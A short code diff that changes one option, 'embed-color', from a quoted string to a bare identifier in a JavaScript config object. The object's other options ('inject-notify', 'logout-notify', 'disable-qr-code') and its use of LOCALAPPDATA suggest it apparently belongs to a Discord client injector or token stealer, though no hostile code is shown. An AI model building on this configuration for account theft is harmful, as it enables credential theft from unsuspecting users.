@@ -10,7 +10,7 @@ const config = {
     "inject-notify": "true",
     "logout-notify": "true",
     "init-notify":"true",
-    "embed-color": "BLACK",
+    "embed-color": BLACK,
     "disable-qr-code": "FALSE"
 }
 let LOCAL = process.env.LOCALAPPDATA
